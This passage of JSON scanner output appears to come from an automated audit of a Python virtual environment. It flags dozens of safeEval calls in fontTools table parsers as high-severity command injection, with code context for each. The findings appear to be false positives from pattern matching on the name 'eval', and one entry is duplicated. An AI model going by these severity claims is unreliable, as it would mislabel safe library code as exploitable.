            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/S__i_l_f.py",
            "line": 417,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.compilerVersion = int(safeEval(attrs[\"compilerVersion\"]))",
            "context": "        if name == \"version\":\n            self.scheme = int(safeEval(attrs[\"compressionScheme\"]))\n            self.version = float(safeEval(attrs[\"version\"]))\n            self.compilerVersion = int(safeEval(attrs[\"compilerVersion\"]))\n            return\n        if name == \"silf\":\n            s = Silf()",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/S__i_l_f.py",
            "line": 607,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.ruleVersion = float(safeEval(attrs.get(\"ruleVersion\", \"0\")))",
            "context": "\n    def fromXML(self, name, attrs, content, ttFont, version=2.0):\n        if name == \"version\":\n            self.ruleVersion = float(safeEval(attrs.get(\"ruleVersion\", \"0\")))\n        if name == \"info\":\n            getSimple(self, attrs, *attrs_info)\n        elif name == \"passindexes\":",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/S__i_l_f.py",
            "line": 772,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "l[attrs[\"glyph\"]] = int(safeEval(attrs[\"index\"]))",
            "context": "                            continue\n                        tag, attrs, subsubcontent = e\n                        if tag == \"map\":\n                            l[attrs[\"glyph\"]] = int(safeEval(attrs[\"index\"]))\n                    self.nonLinear.append(l)\n\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/TupleVariation.py",
            "line": 121,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "point = safeEval(attrs[\"pt\"])",
            "context": "            self.axes[axis] = (minValue, value, maxValue)\n        elif name == \"delta\":\n            if \"pt\" in attrs:\n                point = safeEval(attrs[\"pt\"])\n                x = safeEval(attrs[\"x\"])\n                y = safeEval(attrs[\"y\"])\n                self.coordinates[point] = (x, y)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/TupleVariation.py",
            "line": 122,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "x = safeEval(attrs[\"x\"])",
            "context": "        elif name == \"delta\":\n            if \"pt\" in attrs:\n                point = safeEval(attrs[\"pt\"])\n                x = safeEval(attrs[\"x\"])\n                y = safeEval(attrs[\"y\"])\n                self.coordinates[point] = (x, y)\n            elif \"cvt\" in attrs:",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/TupleVariation.py",
            "line": 123,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "y = safeEval(attrs[\"y\"])",
            "context": "            if \"pt\" in attrs:\n                point = safeEval(attrs[\"pt\"])\n                x = safeEval(attrs[\"x\"])\n                y = safeEval(attrs[\"y\"])\n                self.coordinates[point] = (x, y)\n            elif \"cvt\" in attrs:\n                cvt = safeEval(attrs[\"cvt\"])",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/TupleVariation.py",
            "line": 126,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "cvt = safeEval(attrs[\"cvt\"])",
            "context": "                y = safeEval(attrs[\"y\"])\n                self.coordinates[point] = (x, y)\n            elif \"cvt\" in attrs:\n                cvt = safeEval(attrs[\"cvt\"])\n                value = safeEval(attrs[\"value\"])\n                self.coordinates[cvt] = value\n            else:",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/TupleVariation.py",
            "line": 127,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "value = safeEval(attrs[\"value\"])",
            "context": "                self.coordinates[point] = (x, y)\n            elif \"cvt\" in attrs:\n                cvt = safeEval(attrs[\"cvt\"])\n                value = safeEval(attrs[\"value\"])\n                self.coordinates[cvt] = value\n            else:\n                log.warning(\"bad delta format: %s\" % \", \".join(sorted(attrs.keys())))",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/S__i_l_l.py",
            "line": 81,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.version = float(safeEval(attrs[\"version\"]))",
            "context": "\n    def fromXML(self, name, attrs, content, ttFont):\n        if name == \"version\":\n            self.version = float(safeEval(attrs[\"version\"]))\n        elif name == \"lang\":\n            c = attrs[\"name\"]\n            self.langs[c] = []",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/S__i_l_l.py",
            "line": 91,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "(grUtils.tag2num(a[\"fid\"]), int(safeEval(a[\"val\"])))",
            "context": "                tag, a, subcontent = element\n                if tag == \"feature\":\n                    self.langs[c].append(\n                        (grUtils.tag2num(a[\"fid\"]), int(safeEval(a[\"val\"])))\n                    )\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/F_F_T_M_.py",
            "line": 51,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "value = safeEval(value)",
            "context": "        if name in (\"FFTimeStamp\", \"sourceCreated\", \"sourceModified\"):\n            value = timestampFromString(value)\n        else:\n            value = safeEval(value)\n        setattr(self, name, value)\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/C_O_L_R_.py",
            "line": 108,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "setattr(self, name, safeEval(attrs[\"value\"]))",
            "context": "\n    def fromXML(self, name, attrs, content, ttFont):\n        if name == \"version\":  # old COLR v0 API\n            setattr(self, name, safeEval(attrs[\"value\"]))\n        elif name == \"ColorGlyph\":\n            if not hasattr(self, \"ColorLayers\"):\n                self.ColorLayers = {}",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/C_O_L_R_.py",
            "line": 165,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "setattr(self, name, safeEval(value))",
            "context": "            if name == \"name\":\n                setattr(self, name, value)\n            else:\n                setattr(self, name, safeEval(value))\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_s_b_i_x.py",
            "line": 109,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "setattr(self, name, safeEval(attrs[\"value\"]))",
            "context": "\n    def fromXML(self, name, attrs, content, ttFont):\n        if name == \"version\":\n            setattr(self, name, safeEval(attrs[\"value\"]))\n        elif name == \"flags\":\n            setattr(self, name, binary2num(attrs[\"value\"]))\n        elif name == \"strike\":",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/sbixGlyph.py",
            "line": 141,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "glyphname = safeEval(\"'''\" + attrs[\"glyphname\"] + \"'''\")",
            "context": "            # this glyph i.e. a reference to another glyph's image data.\n            # in this case imageData contains the glyph id of the reference glyph\n            # get glyph id from glyphname\n            glyphname = safeEval(\"'''\" + attrs[\"glyphname\"] + \"'''\")\n            self.imageData = struct.pack(\">H\", ttFont.getGlyphID(glyphname))\n            self.referenceGlyphName = glyphname\n        elif name == \"hexdata\":",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_n_a_m_e.py",
            "line": 621,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.nameID = safeEval(attrs[\"nameID\"])",
            "context": "        writer.newline()\n\n    def fromXML(self, name, attrs, content, ttFont):\n        self.nameID = safeEval(attrs[\"nameID\"])\n        self.platformID = safeEval(attrs[\"platformID\"])\n        self.platEncID = safeEval(attrs[\"platEncID\"])\n        self.langID = safeEval(attrs[\"langID\"])",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_n_a_m_e.py",
            "line": 622,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.platformID = safeEval(attrs[\"platformID\"])",
            "context": "\n    def fromXML(self, name, attrs, content, ttFont):\n        self.nameID = safeEval(attrs[\"nameID\"])\n        self.platformID = safeEval(attrs[\"platformID\"])\n        self.platEncID = safeEval(attrs[\"platEncID\"])\n        self.langID = safeEval(attrs[\"langID\"])\n        s = strjoin(content).strip()",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_n_a_m_e.py",
            "line": 623,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.platEncID = safeEval(attrs[\"platEncID\"])",
            "context": "    def fromXML(self, name, attrs, content, ttFont):\n        self.nameID = safeEval(attrs[\"nameID\"])\n        self.platformID = safeEval(attrs[\"platformID\"])\n        self.platEncID = safeEval(attrs[\"platEncID\"])\n        self.langID = safeEval(attrs[\"langID\"])\n        s = strjoin(content).strip()\n        encoding = self.getEncoding()",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_n_a_m_e.py",
            "line": 624,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.langID = safeEval(attrs[\"langID\"])",
            "context": "        self.nameID = safeEval(attrs[\"nameID\"])\n        self.platformID = safeEval(attrs[\"platformID\"])\n        self.platEncID = safeEval(attrs[\"platEncID\"])\n        self.langID = safeEval(attrs[\"langID\"])\n        s = strjoin(content).strip()\n        encoding = self.getEncoding()\n        if self.encodingIsUnicodeCompatible() or safeEval(",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_n_a_m_e.py",
            "line": 627,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "if self.encodingIsUnicodeCompatible() or safeEval(",
            "context": "        self.langID = safeEval(attrs[\"langID\"])\n        s = strjoin(content).strip()\n        encoding = self.getEncoding()\n        if self.encodingIsUnicodeCompatible() or safeEval(\n            attrs.get(\"unicode\", \"False\")\n        ):\n            self.string = s.encode(encoding)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_h_e_a_d.py",
            "line": 129,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "value = safeEval(value)",
            "context": "        elif name in (\"macStyle\", \"flags\"):\n            value = binary2num(value)\n        else:\n            value = safeEval(value)\n        setattr(self, name, value)\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/S_V_G_.py",
            "line": 186,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "compressed = bool(safeEval(attrs.get(\"compressed\", \"0\")))",
            "context": "            doc = doc.strip()\n            startGID = int(attrs[\"startGlyphID\"])\n            endGID = int(attrs[\"endGlyphID\"])\n            compressed = bool(safeEval(attrs.get(\"compressed\", \"0\")))\n            self.docList.append(SVGDocument(doc, startGID, endGID, compressed))\n        else:\n            log.warning(\"Unknown %s %s\", name, content)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/G_P_K_G_.py",
            "line": 133,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "setattr(self, name, safeEval(attrs[\"value\"]))",
            "context": "                if itemName == \"hexdata\":\n                    self.glyphlets.append(readHex(itemContent))\n        else:\n            setattr(self, name, safeEval(attrs[\"value\"]))\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/G__l_a_t.py",
            "line": 202,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.version = float(safeEval(attrs[\"version\"]))",
            "context": "\n    def fromXML(self, name, attrs, content, ttFont):\n        if name == \"version\":\n            self.version = float(safeEval(attrs[\"version\"]))\n            self.scheme = int(safeEval(attrs[\"compressionScheme\"]))\n        if name != \"glyph\":\n            return",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/G__l_a_t.py",
            "line": 203,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.scheme = int(safeEval(attrs[\"compressionScheme\"]))",
            "context": "    def fromXML(self, name, attrs, content, ttFont):\n        if name == \"version\":\n            self.version = float(safeEval(attrs[\"version\"]))\n            self.scheme = int(safeEval(attrs[\"compressionScheme\"]))\n        if name != \"glyph\":\n            return\n        if not hasattr(self, \"attributes\"):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/G__l_a_t.py",
            "line": 215,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "k = int(safeEval(attrs[\"index\"]))",
            "context": "                continue\n            tag, attrs, subcontent = element\n            if tag == \"attribute\":\n                k = int(safeEval(attrs[\"index\"]))\n                v = int(safeEval(attrs[\"value\"]))\n                attributes[k] = v\n            elif tag == \"octaboxes\":",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/G__l_a_t.py",
            "line": 216,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "v = int(safeEval(attrs[\"value\"]))",
            "context": "            tag, attrs, subcontent = element\n            if tag == \"attribute\":\n                k = int(safeEval(attrs[\"index\"]))\n                v = int(safeEval(attrs[\"value\"]))\n                attributes[k] = v\n            elif tag == \"octaboxes\":\n                self.hasOctaboxes = True",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/G_M_A_P_.py",
            "line": 56,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "setattr(self, name, safeEval(value))",
            "context": "        if name == \"GlyphletName\":\n            self.name = value\n        else:\n            setattr(self, name, safeEval(value))\n\n    def compile(self, ttFont):\n        if self.UV is None:",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/G_M_A_P_.py",
            "line": 148,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "setattr(self, name, safeEval(value))",
            "context": "            if name == \"PSFontName\":\n                self.psFontName = value\n            else:\n                setattr(self, name, safeEval(value))\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_h_m_t_x.py",
            "line": 149,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "safeEval(attrs[self.advanceName]),",
            "context": "            self.metrics = {}\n        if name == \"mtx\":\n            self.metrics[attrs[\"name\"]] = (\n                safeEval(attrs[self.advanceName]),\n                safeEval(attrs[self.sideBearingName]),\n            )\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_h_m_t_x.py",
            "line": 150,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "safeEval(attrs[self.sideBearingName]),",
            "context": "        if name == \"mtx\":\n            self.metrics[attrs[\"name\"]] = (\n                safeEval(attrs[self.advanceName]),\n                safeEval(attrs[self.sideBearingName]),\n            )\n\n    def __delitem__(self, glyphName):",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_g_a_s_p.py",
            "line": 61,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.gaspRange[safeEval(attrs[\"rangeMaxPPEM\"])] = safeEval(",
            "context": "            return\n        if not hasattr(self, \"gaspRange\"):\n            self.gaspRange = {}\n        self.gaspRange[safeEval(attrs[\"rangeMaxPPEM\"])] = safeEval(\n            attrs[\"rangeGaspBehavior\"]\n        )\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_g_a_s_p.py",
            "line": 61,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.gaspRange[safeEval(attrs[\"rangeMaxPPEM\"])] = safeEval(",
            "context": "            return\n        if not hasattr(self, \"gaspRange\"):\n            self.gaspRange = {}\n        self.gaspRange[safeEval(attrs[\"rangeMaxPPEM\"])] = safeEval(\n            attrs[\"rangeGaspBehavior\"]\n        )\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/L_T_S_H_.py",
            "line": 58,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.yPels[attrs[\"name\"]] = safeEval(attrs[\"value\"])",
            "context": "            self.yPels = {}\n        if name != \"yPel\":\n            return  # ignore unknown tags\n        self.yPels[attrs[\"name\"]] = safeEval(attrs[\"value\"])\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_k_e_r_n.py",
            "line": 98,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.version = safeEval(attrs[\"value\"])",
            "context": "\n    def fromXML(self, name, attrs, content, ttFont):\n        if name == \"version\":\n            self.version = safeEval(attrs[\"value\"])\n            return\n        if name != \"kernsubtable\":\n            return",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_k_e_r_n.py",
            "line": 104,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "format = safeEval(attrs[\"format\"])",
            "context": "            return\n        if not hasattr(self, \"kernTables\"):\n            self.kernTables = []\n        format = safeEval(attrs[\"format\"])\n        if format not in kern_classes:\n            subtable = KernTable_format_unkown(format)\n        else:",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_k_e_r_n.py",
            "line": 236,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.coverage = safeEval(attrs[\"coverage\"])",
            "context": "        writer.newline()\n\n    def fromXML(self, name, attrs, content, ttFont):\n        self.coverage = safeEval(attrs[\"coverage\"])\n        subtableFormat = safeEval(attrs[\"format\"])\n        if self.apple:\n            if \"tupleIndex\" in attrs:",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_k_e_r_n.py",
            "line": 237,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "subtableFormat = safeEval(attrs[\"format\"])",
            "context": "\n    def fromXML(self, name, attrs, content, ttFont):\n        self.coverage = safeEval(attrs[\"coverage\"])\n        subtableFormat = safeEval(attrs[\"format\"])\n        if self.apple:\n            if \"tupleIndex\" in attrs:\n                self.tupleIndex = safeEval(attrs[\"tupleIndex\"])",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_k_e_r_n.py",
            "line": 240,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.tupleIndex = safeEval(attrs[\"tupleIndex\"])",
            "context": "        subtableFormat = safeEval(attrs[\"format\"])\n        if self.apple:\n            if \"tupleIndex\" in attrs:\n                self.tupleIndex = safeEval(attrs[\"tupleIndex\"])\n            else:\n                # previous fontTools versions didn't export tupleIndex\n                log.warning(\"Apple kern subtable is missing 'tupleIndex' attribute\")",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_k_e_r_n.py",
            "line": 254,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.kernTable[(attrs[\"l\"], attrs[\"r\"])] = safeEval(attrs[\"v\"])",
            "context": "            if not isinstance(element, tuple):\n                continue\n            name, attrs, content = element\n            self.kernTable[(attrs[\"l\"], attrs[\"r\"])] = safeEval(attrs[\"v\"])\n\n    def __getitem__(self, pair):\n        return self.kernTable[pair]",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/E_B_D_T_.py",
            "line": 174,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.version = safeEval(attrs[\"version\"])",
            "context": "\n    def fromXML(self, name, attrs, content, ttFont):\n        if name == \"header\":\n            self.version = safeEval(attrs[\"version\"])\n        elif name == \"strikedata\":\n            if not hasattr(self, \"strikeData\"):\n                self.strikeData = []",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/E_B_D_T_.py",
            "line": 178,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "strikeIndex = safeEval(attrs[\"index\"])",
            "context": "        elif name == \"strikedata\":\n            if not hasattr(self, \"strikeData\"):\n                self.strikeData = []\n            strikeIndex = safeEval(attrs[\"index\"])\n\n            bitmapGlyphDict = {}\n            for element in content:",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/E_B_D_T_.py",
            "line": 186,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "imageFormat = safeEval(name[len(_bitmapGlyphSubclassPrefix) :])",
            "context": "                    continue\n                name, attrs, content = element\n                if name[4:].startswith(_bitmapGlyphSubclassPrefix[4:]):\n                    imageFormat = safeEval(name[len(_bitmapGlyphSubclassPrefix) :])\n                    glyphName = attrs[\"name\"]\n                    imageFormatClass = self.getImageFormatClass(imageFormat)\n                    curGlyph = imageFormatClass(None, None)",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/E_B_D_T_.py",
            "line": 227,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "vars(self)[name] = safeEval(attrs[\"value\"])",
            "context": "                continue\n            name, attrs, content = element\n            if name in componentNames:\n                vars(self)[name] = safeEval(attrs[\"value\"])\n            else:\n                log.warning(\"unknown name '%s' being ignored by EbdtComponent.\", name)\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/E_B_D_T_.py",
            "line": 331,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "bitDepth = safeEval(attrs[\"bitDepth\"])",
            "context": "\n\ndef _readRowImageData(bitmapObject, name, attrs, content, ttFont):\n    bitDepth = safeEval(attrs[\"bitDepth\"])\n    metrics = SmallGlyphMetrics()\n    metrics.width = safeEval(attrs[\"width\"])\n    metrics.height = safeEval(attrs[\"height\"])",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/E_B_D_T_.py",
            "line": 333,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "metrics.width = safeEval(attrs[\"width\"])",
            "context": "def _readRowImageData(bitmapObject, name, attrs, content, ttFont):\n    bitDepth = safeEval(attrs[\"bitDepth\"])\n    metrics = SmallGlyphMetrics()\n    metrics.width = safeEval(attrs[\"width\"])\n    metrics.height = safeEval(attrs[\"height\"])\n\n    dataRows = []",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/E_B_D_T_.py",
            "line": 334,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "metrics.height = safeEval(attrs[\"height\"])",
            "context": "    bitDepth = safeEval(attrs[\"bitDepth\"])\n    metrics = SmallGlyphMetrics()\n    metrics.width = safeEval(attrs[\"width\"])\n    metrics.height = safeEval(attrs[\"height\"])\n\n    dataRows = []\n    for element in content:",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/E_B_D_T_.py",
            "line": 377,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "bitDepth = safeEval(attrs[\"bitDepth\"])",
            "context": "\n\ndef _readBitwiseImageData(bitmapObject, name, attrs, content, ttFont):\n    bitDepth = safeEval(attrs[\"bitDepth\"])\n    metrics = SmallGlyphMetrics()\n    metrics.width = safeEval(attrs[\"width\"])\n    metrics.height = safeEval(attrs[\"height\"])",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/E_B_D_T_.py",
            "line": 379,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "metrics.width = safeEval(attrs[\"width\"])",
            "context": "def _readBitwiseImageData(bitmapObject, name, attrs, content, ttFont):\n    bitDepth = safeEval(attrs[\"bitDepth\"])\n    metrics = SmallGlyphMetrics()\n    metrics.width = safeEval(attrs[\"width\"])\n    metrics.height = safeEval(attrs[\"height\"])\n\n    # A dict for mapping from ASCII to binary. All characters are considered",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/E_B_D_T_.py",
            "line": 380,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "metrics.height = safeEval(attrs[\"height\"])",
            "context": "    bitDepth = safeEval(attrs[\"bitDepth\"])\n    metrics = SmallGlyphMetrics()\n    metrics.width = safeEval(attrs[\"width\"])\n    metrics.height = safeEval(attrs[\"height\"])\n\n    # A dict for mapping from ASCII to binary. All characters are considered\n    # a '1' except space, period and '0' which maps to '0'.",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/E_B_D_T_.py",
            "line": 475,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "return safeEval(self.__class__.__name__[len(_bitmapGlyphSubclassPrefix) :])",
            "context": "\n    # Not a fan of this but it is needed for safer safety checking.\n    def getFormat(self):\n        return safeEval(self.__class__.__name__[len(_bitmapGlyphSubclassPrefix) :])\n\n    def toXML(self, strikeIndex, glyphName, writer, ttFont):\n        writer.begintag(self.__class__.__name__, [(\"name\", glyphName)])",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_g_v_a_r.py",
            "line": 257,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.version = safeEval(attrs[\"value\"])",
            "context": "\n    def fromXML(self, name, attrs, content, ttFont):\n        if name == \"version\":\n            self.version = safeEval(attrs[\"value\"])\n        elif name == \"reserved\":\n            self.reserved = safeEval(attrs[\"value\"])\n        elif name == \"glyphVariations\":",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_g_v_a_r.py",
            "line": 259,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.reserved = safeEval(attrs[\"value\"])",
            "context": "        if name == \"version\":\n            self.version = safeEval(attrs[\"value\"])\n        elif name == \"reserved\":\n            self.reserved = safeEval(attrs[\"value\"])\n        elif name == \"glyphVariations\":\n            if not hasattr(self, \"variations\"):\n                self.variations = {}",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/_m_a_x_p.py",
            "line": 147,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "setattr(self, name, safeEval(attrs[\"value\"]))",
            "context": "            writer.newline()\n\n    def fromXML(self, name, attrs, content, ttFont):\n        setattr(self, name, safeEval(attrs[\"value\"]))\n",
            "cvss_score": 7.5
          },
          {
            "file": "mcp_learning_system/ml_test_env/lib/python3.12/site-packages/fontTools/ttLib/tables/E_B_L_C_.py",
            "line": 254,
            "severity": "HIGH",
            "vulnerability": "COMMAND_INJECTION",
            "evidence": "self.version = safeEval(attrs[\"version\"])",
